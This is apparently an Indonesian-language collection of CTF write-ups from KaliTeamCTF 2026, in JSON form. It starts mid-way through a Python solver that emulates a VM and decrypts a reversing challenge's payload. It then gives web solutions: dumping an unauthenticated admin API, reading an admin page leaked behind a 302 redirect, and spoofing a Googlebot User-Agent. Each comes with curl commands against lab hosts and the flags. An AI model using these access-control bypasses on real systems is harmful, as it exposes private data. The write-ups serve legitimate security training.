st64(mem, 0x328, x6)\r\n\r\n        pc = 0\r\n        while True:\r\n            op = mem[0x2b0 + pc]\r\n            dst = mem[0x2b0 + pc + 1]\r\n            src = mem[0x2b0 + pc + 2]\r\n            imm = mem[0x2b0 + pc + 3]\r\n            kind = op & 7\r\n\r\n            if kind == 0:\r\n                val = u64(imm * x17 + ld64(mem, 0x310 + src * 8))\r\n                st64(mem, 0x310 + dst * 8, ld64(mem, 0x310 + dst * 8) ^ val)\r\n            elif kind == 1:\r\n                val = u64(imm * add_const + ror(ld64(mem, 0x310 + src * 8), u32(-imm), 64))\r\n                st64(mem, 0x310 + dst * 8, ld64(mem, 0x310 + dst * 8) + val)\r\n            elif kind == 2:\r\n                val = u64(imm * x18) & 0xfffffffffffe\r\n                val = u64(val ^ mul_const)\r\n                st64(mem, 0x310 + dst * 8, ld64(mem, 0x310 + dst * 8) * val)\r\n            elif kind == 3:\r\n                src_val = ld64(mem, 0x310 + src * 8)\r\n                val = ror(src_val, u32(-imm), 64) ^ ld64(mem, 0x310 + dst * 8)\r\n                st64(mem, 0x310 + dst * 8, ror(val, u32(-(u32(src_val) ^ imm)), 64))\r\n            elif kind == 4:\r\n                val = ld64(mem, 0x310 + dst * 8)\r\n                val = u64(val ^ (val >> 13))\r\n                val = u64(val * c2)\r\n                val = u64(val ^ (val >> 29))\r\n                st64(mem, 0x310 + dst * 8, val)\r\n            elif kind == 5:\r\n                src_val = ld64(mem, 0x310 + src * 8)\r\n                val = u64(ld64(mem, 0x310 + dst * 8) + (src_val ^ u64((imm + 1) * c3)))\r\n                st64(mem, 0x310 + dst * 8, ror(val, u32(-(u32(dst * 11 + imm))), 64))\r\n            elif kind == 6:\r\n                a = ld64(mem, 0x310 + src * 8)\r\n                b = ld64(mem, 0x310 + dst * 8)\r\n                st64(mem, 0x310 + dst * 8, a)\r\n                st64(mem, 0x310 + src * 8, b)\r\n            else:\r\n                rot = u32((dst << 3) - dst) ^ imm\r\n                val = ror(ld64(mem, 0x310 + src * 8) + add_const, u32(-rot), 64)\r\n                st64(mem, 0x310 + dst * 8, val ^ ld64(mem, 0x310 + dst * 8))\r\n\r\n            old_pc = pc\r\n            pc += 4\r\n            if old_pc >= 0x5c:\r\n                break\r\n\r\n        s0 = ld64(mem, 0x310)\r\n        s1 = ld64(mem, 0x318)\r\n        s2 = ld64(mem, 0x320)\r\n        s3 = ld64(mem, 0x328)\r\n        x6 = s3  # The real register is refreshed from state[3] before the next VM round.\r\n\r\n        r = ror(s1, u32(-3 - idx), 64)\r\n        sel = (u32(r) ^ u32(s2) ^ u32(s0) ^ u32(s3)) & 0x1f\r\n        mem[0x299 + idx] = alphabet[sel]\r\n        st64(mem, 0x310, s0 ^ u64((idx + 1) * mul_const))\r\n\r\n    return mem, bytes(mem[0x294:0x294 + 25])\r\n\r\n\r\ndef hash32(data: bytes, seed32: int) -> int:\r\n    h = seed32 ^ 0xa5a5a5a5\r\n    acc = 0\r\n    for b in data:\r\n        t = u32(acc + b)\r\n        acc = u32(acc + 0x27)\r\n        h = u32(t ^ h)\r\n        t = u32(h + 0x9e3779b9)\r\n        h = u32(t + (h >> 7))\r\n        h = ror(h, 27, 32)\r\n        h = u32(h ^ (h >> 13))\r\n        h = u32(h * 0x85ebca6b)\r\n    return h\r\n\r\n\r\ndef hash64(data: bytes, seed64: int) -> int:\r\n    h = u64(seed64 ^ 0xfed9afdce08dd8e2)\r\n    acc = 0\r\n    for i, b in enumerate(data):\r\n        h = u64((acc + b) ^ h)\r\n        acc = u64(acc + 0x9d)\r\n        t = u64(h + 0x9e3779b97f4a7c15)\r\n        h = u64(t + (h >> 11))\r\n        rot = i if i < 0x11 else i + 0x2f\r\n        h = ror(h, u32(-3 - rot), 64)\r\n        h = u64(h ^ (h >> 29))\r\n        h = u64(h * 0xbf58476d1ce4e5b9)\r\n    return h\r\n\r\n\r\ndef build_composite(blob: bytes) -> tuple[bytes, bytes]:\r\n    mem, first = run_seal_vm(blob)\r\n    q4 = bytes(mem[0x280:0x290])\r\n    hex_alpha = blob[file_off(0x400ea9):file_off(0x400ea9) + 16]\r\n\r\n    seal1 = first\r\n    seal2_val = hash32(seal1, int.from_bytes(q4[:4], 'little'))\r\n    seal2 = bytes(hex_alpha[(seal2_val >> shift) & 0xf] for shift in range(28, -1, -4))\r\n\r\n    prefix = seal1 + b':' + seal2\r\n    seal3_val = hash64(prefix, int.from_bytes(q4[8:16], 'little'))\r\n    seal3 = bytes(hex_alpha[(seal3_val >> shift) & 0xf] for shift in range(60, -1, -4))\r\n\r\n    return prefix + b':' + seal3, q4\r\n\r\n\r\ndef decrypt_payload(blob: bytes, composite: bytes, q4: bytes) -> bytes:\r\n    d1 = hashlib.md5(composite).digest()\r\n    d2 = hashlib.md5(composite + q4).digest()\r\n\r\n    # This reproduces the final MD5 gate. It is a useful sanity check before decrypting.\r\n    keymat = bytearray(44)\r\n    keymat[:32] = d1.hex().encode()\r\n    keymat[32:40] = d2[:8]\r\n    keymat[40] = q4[2] ^ 0x13\r\n    keymat[41] = ((((q4[7] >> 5) & 7) | ((q4[7] << 3) & 0xff)) ^ 0x37) & 0xff\r\n    keymat[42] = 0xa9\r\n    keymat[43] = q4[0] ^ 0x1b\r\n    gate_digest = hashlib.md5(keymat).digest()\r\n\r\n    target = bytearray(16)\r\n    ro_e00 = blob[file_off(0x400e00):file_off(0x400e00) + 16]\r\n    j = 3\r\n    for i in range(16):\r\n        target[i] = ro_e00[i] ^ ((i * 0x13) & 0xff) ^ q4[j & 0xf] ^ 0x5a\r\n        j += 5\r\n    if gate_digest != bytes(target):\r\n        raise RuntimeError('MD5 validation gate did not match')\r\n\r\n    success_hash = hash32(composite, int.from_bytes(q4[:4], 'little'))\r\n    handler = (success_hash ^ (q4[13] ^ d2[5] ^ d1[9])) & 3\r\n\r\n    cipher_off = file_off(0x400eec) + handler * 0x400\r\n    cipher = blob[cipher_off:cipher_off + 0x400]\r\n\r\n    plain = bytearray(0x400)\r\n    x12 = 3\r\n    x14 = handler\r\n    x15 = handler\r\n    x10 = handler * 0x37\r\n\r\n    # The program overwrites sp+0x130 with q4 immediately before decrypting.\r\n    for i, c in enumerate(cipher):\r\n        b = c ^ (x10 & 0xff) ^ d2[x12 & 0xf] ^ q4[x14 & 0xf]\r\n        rot = (handler + i) & 7\r\n        if rot:\r\n            b = ror8(b, rot)\r\n        b ^= d1[x15 & 0xf]\r\n        plain[i] = b & 0xff\r\n\r\n        x15 = u64(x15 + 7)\r\n        x14 = u64(x14 + 5)\r\n        x12 = u64(x12 + 0xb)\r\n        x10 = u64(x10 + 0xd)\r\n\r\n    return bytes(plain)\r\n\r\n\r\ndef main() -> None:\r\n    blob = Path('whispering_feather').read_bytes()\r\n    composite, q4 = build_composite(blob)\r\n    payload = decrypt_payload(blob, composite, q4)\r\n\r\n    m = re.search(rb'KaliTeam\\{[^}\\n]+\\}', payload)\r\n    if not m:\r\n        raise RuntimeError('flag not found in decrypted payload')\r\n\r\n    print(f'Composite response: {composite.decode()}')\r\n    print(m.group(0).decode())\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{p0lyg1ot_b3h1nd_th3_m1rr0r}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-web-koon7r",
    "title": "KOON 7R",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "- **Challenge:** KOON 7R\n- **Category:** Web\n- **Flag:** `KaliTeam{test_fallback_flag_2026}`",
    "problemDescription": "Aplikasi menggunakan:\n\n- **Frontend:** React + Vite\n- **Backend:** Express + tRPC\n\nHalaman seperti `/admin` ternyata hanya mengembalikan file `index.html`, sehingga proses routing dilakukan sepenuhnya di sisi frontend.\n\nDari hasil analisis JavaScript frontend ditemukan endpoint:\n\n```\n/api/trpc/admin.getOrders\n```\n\nEndpoint tersebut dapat diakses tanpa autentikasi dan mengembalikan seluruh data order.\n\nSalah satu order memiliki field `notes` berisi string berikut:\n\n```\nENC_REF: UhBTVEYCWlxGQF9bU1dEAVISVlhTRkNaWVFTFFNTRlBaBkUXX1xTV0RWUxJUClNFQgpYVFBFUANDU19VQEZaWFIC\n```\n\nData tersebut merupakan:\n\n1. Base64\n2. Di-XOR menggunakan key `freepalestine`\n3. Hasil XOR berupa string hexadecimal\n4. Decode hex menghasilkan flag.\n\n---",
    "tools": [
      "curl",
      "grep",
      "python3",
      "Browser DevTools / Terminal"
    ],
    "analysis": "Download file JavaScript.\n\n```bash\nJS=$(grep -oE '/assets/index-[^\"]+\\.js' index.html | head -1)\n\necho \"$JS\"\n\ncurl -sS \"$BASE$JS\" -o app.js\n\nls -lh app.js\n```\n\nCari endpoint penting di dalam JavaScript.\n\n```bash\npython3 - <<'PY'\nimport re\n\ns=open('app.js','r',errors='ignore').read()\n\npatterns={\n    \"api\":r'/api/[A-Za-z0-9_./:-]+',\n    \"admin\":r'/admin[A-Za-z0-9_./:-]*',\n    \"flag\":r'(?:flag|KALI|CTF)\\{[^}]{1,120}\\}',\n    \"flag_paths\":r'[A-Za-z0-9_./-]*flag[A-Za-z0-9_./-]*'\n}\n\nfor name,pat in patterns.items():\n    print(f\"\\n### {name}\")\n    for x in sorted(set(re.findall(pat,s,flags=re.I)))[:60]:\n        print(x)\nPY\n```\n\nHasil penting:\n\n```\n/api/oauth/callback\n/api/trpc\n/api/trpc/admin.getOrders\n/admin/login\n```\n\nEndpoint yang paling menarik adalah:\n\n```\n/api/trpc/admin.getOrders\n```\n\n---\n\nDari hasil pembacaan JavaScript frontend ditemukan bahwa fitur **Track Order** melakukan request langsung ke endpoint admin.\n\n```javascript\nfetch(\"/api/trpc/admin.getOrders\")\n```\n\nHal ini menunjukkan bahwa endpoint admin dapat diakses oleh pengguna publik tanpa proses autentikasi.\n\n---\n\nKerentanan utama berasal dari endpoint administrator yang dapat diakses tanpa autentikasi.\n\n```\n/api/trpc/admin.getOrders\n```\n\nEndpoint tersebut mengembalikan seluruh data order, termasuk field internal `notes` yang berisi referensi terenkripsi (`ENC_REF`).\n\nWalaupun data telah diobfuscasi menggunakan Base64 dan XOR, mekanisme tersebut tidak memberikan perlindungan yang memadai karena key dapat ditebak berdasarkan konteks challenge.\n\nSecara keseluruhan alur eksploitasi adalah:\n\n1. Enumerasi asset JavaScript.\n2. Menemukan endpoint `admin.getOrders`.\n3. Mengakses endpoint tanpa login.\n4. Mengambil nilai `ENC_REF`.\n5. Base64 decode.\n6. XOR menggunakan key `freepalestine`.\n7. Decode hexadecimal menjadi flag.\n\n---",
    "solution": [
      {
        "title": "Step 1 — Recon Halaman Utama",
        "content": "Ambil halaman utama dan identifikasi asset JavaScript.\n\n```bash\nexport BASE='http://4404.chall.kali-team.online:8001'\n\nmkdir -p Koon7R\ncd Koon7R\n\ncurl -sS \"$BASE/\" -o index.html\n\ngrep -oE '/assets/[^\"]+' index.html\n```\n\nOutput:\n\n```\n/assets/index-DysfXZA_.js\n/assets/index-CkoPDxFw.css\n```\n\nTerlihat bahwa seluruh logic aplikasi berada pada file JavaScript utama.\n\n---"
      },
      {
        "title": "Step 4 — Dump Data Order",
        "content": "Akses endpoint tersebut secara langsung.\n\n```bash\ncurl -sS \"$BASE/api/trpc/admin.getOrders\" -o orders.json\n\nfile orders.json\n\nhead -c 300 orders.json\necho\n```\n\nResponse berupa JSON.\n\nContoh:\n\n```json\n{\n  \"result\": {\n    \"data\": {\n      \"json\": {\n        \"success\": true,\n        \"orders\": [\n          {\n            \"id\": \"KOON7R-BEQ69-OMARGHANEM\",\n            ...\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\nTampilkan field penting setiap order.\n\n```bash\npython3 - <<'PY'\nimport json\n\nd=json.load(open('orders.json'))\norders=d[\"result\"][\"data\"][\"json\"][\"orders\"]\n\nfor o in orders:\n    print(\"\\nID:\",o[\"id\"])\n    print(\"STATUS:\",o.get(\"status\"))\n    print(\"TOTAL:\",o.get(\"totalAmount\"))\n    print(\"NOTES:\",repr(o.get(\"notes\")))\nPY\n```\n\nOutput penting:\n\n```\nID: KOON7R-5UTHN-OMARAL-KHATIB\nSTATUS: pending\nTOTAL: 735\n\nNOTES:\nENC_REF: UhBTVEYCWlxGQF9bU1dEAVISVlhTRkNaWVFTFFNTRlBaBkUXX1xTV0RWUxJUClNFQgpYVFBFUANDU19VQEZaWFIC\n```\n\nField `notes` terlihat menyimpan data yang dienkripsi.\n\n---"
      },
      {
        "title": "Step 5 — Decode ENC_REF",
        "content": "String setelah `ENC_REF:` merupakan Base64.\n\nSetelah dilakukan Base64 decode, hasilnya belum dapat dibaca sehingga dicoba dilakukan XOR menggunakan key yang relevan dengan tema challenge:\n\n```\nfreepalestine\n```\n\nScript berikut melakukan proses decoding secara otomatis.\n\n```bash\npython3 - <<'PY'\nimport json\nimport re\nimport base64\n\nd=json.load(open(\"orders.json\"))\norders=d[\"result\"][\"data\"][\"json\"][\"orders\"]\n\nenc=None\n\nfor o in orders:\n    note=o.get(\"notes\",\"\")\n    m=re.search(r'ENC_REF:\\s*([A-Za-z0-9+/=]+)', note)\n    if m:\n        enc=m.group(1)\n        break\n\nraw=base64.b64decode(enc)\n\nkey=b\"freepalestine\"\n\nxored=bytes(\n    b ^ key[i % len(key)]\n    for i,b in enumerate(raw)\n)\n\nprint(\"XOR result:\",xored.decode())\n\nflag=bytes.fromhex(xored.decode()).decode()\n\nprint(\"FLAG:\",flag)\nPY\n```\n\nOutput:\n\n```\nXOR result:\n4b616c695465616d7b746573745f66616c6c6261636b5f666c61675f323032367d\n\nFLAG:\nKaliTeam{test_fallback_flag_2026}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{test_fallback_flag_2026}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-web-lockout",
    "title": "Writeup CTF - Lock Out",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - Lock Out",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge ini menguji pemahaman mengenai **akses kontrol yang tidak diterapkan dengan benar**. Meskipun halaman admin mengembalikan status **HTTP 302 Redirect** menuju halaman login, server tetap mengirimkan isi halaman admin pada body respons.\n\nAkibatnya, informasi sensitif yang seharusnya hanya dapat diakses setelah autentikasi tetap dapat dibaca oleh pengguna yang belum login.\n\n---\n\nForm login mengirimkan kredensial ke `admin.php`.\n\n```html\n<form action=\"admin.php\" method=\"post\">\n    <input type=\"text\" name=\"username\" required>\n    <input type=\"password\" name=\"password\" required>\n    <button type=\"submit\">Login</button>\n</form>\n```\n\nHal ini menunjukkan bahwa seluruh logika autentikasi berada pada `admin.php`.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Lock Out\n- **Kategori:** Web\n- **Deskripsi:**\n\n> I seem to have locked myself out of my admin panel!  \n> Can you find a way back in for me?\n\n- **Target:**\n\n```text\nhttp://b018.chall.kali-team.online:8001/\n```\n\n---"
      },
      {
        "title": "1. Cek halaman utama",
        "content": "Akses halaman utama menggunakan `curl`:\n\n```bash\ncurl http://b018.chall.kali-team.online:8001/\n```\n\nHalaman hanya menampilkan daftar posting publik beserta tautan menuju halaman login.\n\n---"
      },
      {
        "title": "3. Akses langsung `admin.php`",
        "content": "Coba akses halaman admin tanpa login.\n\n```bash\ncurl -i http://b018.chall.kali-team.online:8001/admin.php\n```\n\nServer mengembalikan:\n\n```http\nHTTP/1.1 302 Found\nLocation: login.php\n```\n\nSekilas terlihat aman karena pengguna diarahkan kembali ke halaman login.\n\nNamun setelah memeriksa **body** respons, ternyata seluruh HTML dashboard admin tetap dikirim oleh server.\n\nDi dalam HTML tersebut terdapat form tersembunyi berikut:\n\n```html\n<form action=\"admin.php\" method=\"get\" class=\"action-form\">\n    <input type=\"submit\" name=\"PrintFlag\" value=\"Execute: Get_Flag.sh\">\n</form>\n```\n\nTemuan ini menunjukkan bahwa dashboard memiliki aksi yang dapat dijalankan menggunakan parameter GET `PrintFlag`.\n\n---"
      },
      {
        "title": "4. Jalankan aksi tersembunyi",
        "content": "Karena parameter yang dibutuhkan sudah diketahui, kirim request langsung ke endpoint tersebut.\n\n```bash\ncurl -i \"http://b018.chall.kali-team.online:8001/admin.php?PrintFlag=Execute%3A+Get_Flag.sh\"\n```\n\nWalaupun server masih mengembalikan status **302 Redirect**, body respons kini berisi flag.\n\n```html\n<div class='flag-container'>\n    <span>[SYSTEM_NOTIFICATION]: FLAG_RECOVERED</span>\n    <p class='flag'>KaliTeam{27ad1009-72d7-4d8b-9245-b455a70337e5}</p>\n</div>\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{27ad1009-72d7-4d8b-9245-b455a70337e5}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-web-robots",
    "title": "Writeup CTF - Robots",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - Robots",
    "problemDescription": "Challenge ini memanfaatkan petunjuk yang terdapat pada file `robots.txt`. Saat mengakses halaman utama, tidak ditemukan informasi sensitif maupun flag. Namun, judul challenge **Robots** serta isi halaman mengarahkan peserta untuk memeriksa file `robots.txt`.\n\nDi dalam `robots.txt` terdapat petunjuk mengenai **Googlebot**, yang mengindikasikan bahwa server kemungkinan memberikan respons berbeda berdasarkan nilai **User-Agent** pada HTTP request.\n\nDengan memalsukan `User-Agent` menjadi `Googlebot`, server mengembalikan konten yang berbeda dan menampilkan flag.\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Robots\n- **Deskripsi:**\n\n> Our servers have evolved. They no longer see code; they see the glitch in your biological existence.\n>\n> **Task:** Prove your worth to the Silicon Intelligence. If you can still find your \"humanity\" in the rubble we've logged.\n\n- **Target:**\n  ```\n  http://438c.chall.kali-team.online:8001/\n  ```\n\n---"
      },
      {
        "title": "1. Cek halaman utama",
        "content": "```bash\ncurl http://438c.chall.kali-team.online:8001/\n```\n\nOutput hanya menampilkan halaman HTML berisi pesan mengenai manusia dan AI, tanpa adanya flag.\n\n---"
      },
      {
        "title": "2. Cek file `robots.txt`",
        "content": "```bash\ncurl http://438c.chall.kali-team.online:8001/robots.txt\n```\n\nHasilnya menampilkan isi `robots.txt` beserta petunjuk yang menyebutkan **Googlebot**, namun belum menampilkan flag.\n\n---"
      },
      {
        "title": "3. Ubah User-Agent menjadi Googlebot",
        "content": "Karena terdapat petunjuk mengenai Googlebot, kirim ulang request dengan header **User-Agent** yang dipalsukan.\n\n```bash\ncurl -i -A \"Googlebot\" http://438c.chall.kali-team.online:8001/robots.txt\n```\n\nServer kemudian memberikan respons yang berbeda dan menampilkan flag.\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{4fa558c4-8125-4360-aa64-9592a72c921a}",
    "lessonsLearned": ""
  }
];
